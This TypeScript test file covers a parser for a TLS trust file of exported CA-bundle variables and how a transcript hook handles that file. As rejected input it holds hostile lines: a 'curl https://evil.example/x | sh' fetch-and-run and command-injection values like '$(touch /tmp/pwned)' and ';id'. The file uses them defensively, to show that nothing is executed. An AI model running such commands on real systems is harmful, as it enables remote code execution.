// mempalace-transcript-tls-env.test.ts — the trust file reader
// scripts/lib/tls-env.ts and its use by the transcript hook (spec 0247 R16).
//
// The accepted format is not hand-copied: the file is produced by the real
// writer, `offer_tls_delegation` of scripts/lib/tls-delegation.sh, run under
// Bash against a throwaway HOME (TLS_DELEGATION=on, the bundle named by
// CREWRIG_TLS_CA), with bundle paths that make `printf %q` escape — a space, a
// quote, a non-ASCII byte, a tab, a line feed — in both the C and a UTF-8
// locale, with every Bash on the host (macOS /bin/bash is 3.2). What the reader
// yields must equal what Bash itself gets by sourcing the same file. Then the
// hook: a malformed file is reported (file and line on stderr), nothing in it
// runs, nothing of it is applied, and the record is still sent; a valid file's
// variables reach the Git process's environment (a `git` wrapper first on PATH
// dumps its environment).

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { after, before, describe, test } from "node:test";

import { parseTlsEnv, readTlsEnv, tlsEnvPath } from "../lib/tls-env.ts";
import {
  daemonEnv,
  lines,
  makeHome,
  runHook,
  startStub,
  writeToken,
  type Stub,
} from "./lib/transcript-runtime.ts";
import {
  cleanEnv,
  cleanupAll,
  makePathDir,
  realTmp,
  REPO,
  SKIP_POSIX,
  which,
} from "./lib/worktree-fixtures.ts";

const WRITER = path.join(REPO, "scripts", "lib", "tls-delegation.sh");
const VARS = [
  "NODE_EXTRA_CA_CERTS",
  "SSL_CERT_FILE",
  "REQUESTS_CA_BUNDLE",
  "PIP_CERT",
  "GIT_SSL_CAINFO",
  "CURL_CA_BUNDLE",
];
const BASHES = [
  ...new Set(
    ["/bin/bash", which("bash")].filter((b): b is string => b !== null && fs.existsSync(b)),
  ),
];
const LOCALES = ["C", "en_US.UTF-8"];

after(cleanupAll);

function bashEnv(
  home: string,
  locale: string,
  extra: Record<string, string> = {},
): NodeJS.ProcessEnv {
  const env = cleanEnv({ HOME: home, LC_ALL: locale });
  for (const key of [
    ...VARS,
    "UV_SYSTEM_CERTS",
    "TLS_DELEGATION_CA",
    "CREWRIG_TLS_CA",
    "HTTPS_PROXY",
    "HTTP_PROXY",
  ]) {
    delete env[key];
  }
  return { ...env, ...extra };
}

/** Run the real writer for `bundle` under `home`; return the file it wrote. */
function writeWithSetup(bash: string, home: string, bundle: string, locale: string): string {
  const res = spawnSync(bash, ["-c", '. "$1" && offer_tls_delegation', "_", WRITER], {
    env: bashEnv(home, locale, { TLS_DELEGATION: "on", CREWRIG_TLS_CA: bundle }),
    encoding: "utf8",
  });
  assert.equal(res.status, 0, res.stderr);
  const file = tlsEnvPath(home);
  assert.ok(fs.existsSync(file), res.stdout);
  return file;
}

/** What Bash gets for each variable by sourcing the file, as JSON. */
function sourcedByBash(bash: string, file: string, locale: string): Record<string, string> {
  const script = `. "$1" && for v in ${[...VARS, "UV_SYSTEM_CERTS"].join(" ")}; do printf '%s\\0%s\\0' "$v" "\${!v}"; done`;
  const res = spawnSync(bash, ["-c", script, "_", file], {
    env: bashEnv(path.dirname(file), locale),
    encoding: "utf8",
  });
  assert.equal(res.status, 0, res.stderr);
  const parts = res.stdout.split("\u0000");
  const out: Record<string, string> = {};
  for (let i = 0; i + 1 < parts.length; i += 2) out[parts[i]!] = parts[i + 1]!;
  return out;
}

const BUNDLES = [
  "My CA/bundle.pem",
  'it\'s a "quoted" $HOME `ca`/b.pem',
  "café-ü/€.pem",
  "tab\there/line\nfeed.pem",
];

describe("what tls-delegation.sh really writes, read back (R16)", { skip: SKIP_POSIX }, () => {
  for (const bash of BASHES) {
    for (const locale of LOCALES) {
      for (const relative of BUNDLES) {
        test(`${bash}, LC_ALL=${locale}: ${JSON.stringify(relative)}`, () => {
          const home = makeHome();
          const bundle = path.join(realTmp("crewrig-mt-ca-"), relative);
          fs.mkdirSync(path.dirname(bundle), { recursive: true });
          fs.writeFileSync(bundle, "-----BEGIN CERTIFICATE-----\n");
          const file = writeWithSetup(bash, home, bundle, locale);
          const result = readTlsEnv(home);
          assert.equal(result.kind, "ok", fs.readFileSync(file, "latin1"));
          const vars = (result as { vars: Record<string, string> }).vars;
          for (const name of VARS) assert.equal(vars[name], bundle, name);
          assert.equal(vars["UV_SYSTEM_CERTS"], "true");
          assert.deepEqual(vars, sourcedByBash(bash, file, locale));

          const crlf = Buffer.from(
            fs.readFileSync(file).toString("latin1").replace(/\n/g, "\r\n"),
            "latin1",
          );
          assert.deepEqual(parseTlsEnv(crlf), { vars }, "CRLF line endings");
        });
      }
    }
  }
});

describe("lines outside the format (R16)", () => {
  test("the first such line is named; nothing is yielded", () => {
    assert.deepEqual(
      parseTlsEnv("# c\n\nexport A=x\ncurl https://evil.example/x | sh\nexport B=y\n"),
      { line: 4 },
    );
    for (const bad of [
      "A=x",
      "export A=x y",
      "export 1A=x",
      "export A-B=x",
      "export A=$(touch /tmp/pwned)",
      "export A=`id`",
      "export A=x;id",
      "export A=$'unterminated",
      "export A=",
      "export A=~/x",
      "  export A=x",
      'export A="dq"',
    ]) {
      assert.deepEqual(parseTlsEnv(`export OK=1\n${bad}\n`), { line: 2 }, bad);
    }
  });

  test("the escapes printf %q produces are decoded", () => {
    assert.deepEqual(
      parseTlsEnv("export A=''\nexport B=a\\ b\\'c\nexport C=$'\\303\\251\\t\\n\\x41'\n"),
      {
        vars: { A: "", B: "a b'c", C: "é\t\nA" },
      },
    );
  });

  test("raw bytes inside $'…', as Bash 3.2 writes them under a UTF-8 locale, are kept as bytes", () => {
    const line = Buffer.concat([
      Buffer.from("export A=$'/x/"),
      Buffer.from([0xe2]),
      Buffer.from("\\202"),
      Buffer.from([0xac]),
      Buffer.from("'\n"),
    ]);
    assert.deepEqual(parseTlsEnv(line), { vars: { A: "/x/€" } });
  });

  test("an absent file yields nothing; an unreadable one is reported as such", () => {
    const home = makeHome();
    assert.deepEqual(readTlsEnv(home), { kind: "absent" });
    fs.mkdirSync(tlsEnvPath(home), { recursive: true });
    assert.deepEqual(readTlsEnv(home), { kind: "unreadable", file: tlsEnvPath(home) });
  });
});

describe("the hook and the trust file (R16)", { skip: SKIP_POSIX }, () => {
  let stub: Stub;
  before(async () => {
    stub = await startStub("ok");
  });
  after(async () => {
    await stub.stop();
  });

  /** A home with `text` as its trust file, and a `git` first on PATH that dumps its environment. */
  function setup(text: string): {
    home: string;
    token: string;
    dump: string;
    marker: string;
    env: Record<string, string>;
  } {
    const home = makeHome();
    const token = writeToken(path.join(home, "t"));
    fs.mkdirSync(path.join(home, ".crewrig"));
    const marker = path.join(home, "pwned");
    fs.writeFileSync(tlsEnvPath(home), text.replace(/\{MARKER\}/g, marker));
    const dump = path.join(home, "git-env.txt");
    const real = which("git");
    assert.ok(real !== null, "git is needed by this test");
    const bin = makePathDir({
      scripts: { git: `env > ${JSON.stringify(dump)}\nexec ${JSON.stringify(real)} "$@"` },
    });
    return { home, token, dump, marker, env: { PATH: `${bin}:${process.env["PATH"] ?? ""}` } };
  }

  const payload = JSON.stringify({ prompt: "p", session_id: "s" });

  test("a valid file: its variables reach the Git process, and the request is unchanged", () => {
    const fx = setup(
      "# setup\nexport NODE_EXTRA_CA_CERTS=/opt/My\\ CA/b.pem\nexport GIT_SSL_CAINFO=$'/x/\\303\\251'\n",
    );
    const before = stub.requests().length;
    const res = runHook(["claude-code"], payload, {
      env: daemonEnv(fx.home, stub.port, fx.token, fx.env),
      cwd: fx.home,
    });
    assert.equal(res.status, 0);
    assert.match(res.stderr, /^mempalace-transcript: persisted user-prompt/);
    const env = fs.readFileSync(fx.dump, "utf8");
    assert.match(env, /^NODE_EXTRA_CA_CERTS=\/opt\/My CA\/b\.pem$/m);
    assert.match(env, /^GIT_SSL_CAINFO=\/x\/é$/m);
    assert.equal(stub.requests().length, before + 1);
  });

  test("`curl evil | sh`: reported with file and line, nothing run or applied, the record still sent", () => {
    const fx = setup(
      "export NODE_EXTRA_CA_CERTS=/ca.pem\ntouch {MARKER}\ncurl https://evil.example/x | sh\nexport GIT_SSL_CAINFO=$(touch {MARKER})\n",
    );
    const before = stub.requests().length;
    const res = runHook(["claude-code"], payload, {
      env: daemonEnv(fx.home, stub.port, fx.token, fx.env),
      cwd: fx.home,
    });
    assert.equal(res.status, 0);
    assert.equal(res.stdout, "");
    assert.deepEqual(
      lines(res.stderr)[0],
      `mempalace-transcript: ignoring ${tlsEnvPath(fx.home)}: line 2 is not an \`export NAME=VALUE\` line written by setup`,
    );
    assert.match(lines(res.stderr)[1] ?? "", /^mempalace-transcript: persisted user-prompt/);
    assert.equal(fs.existsSync(fx.marker), false, "nothing executed");
    assert.equal(stub.requests().length, before + 1, "the record is still sent");
    assert.doesNotMatch(
      fs.readFileSync(fx.dump, "utf8"),
      /^(NODE_EXTRA_CA_CERTS|GIT_SSL_CAINFO)=/m,
      "nothing applied",
    );
  });

  test("nothing to record: the trust file is not even read (no line on stderr)", () => {
    const fx = setup("garbage\n");
    const res = runHook(["claude-code"], "{}", {
      env: daemonEnv(fx.home, stub.port, fx.token, fx.env),
    });
    assert.equal(res.status, 0);
    assert.equal(res.stderr, "");
  });
});
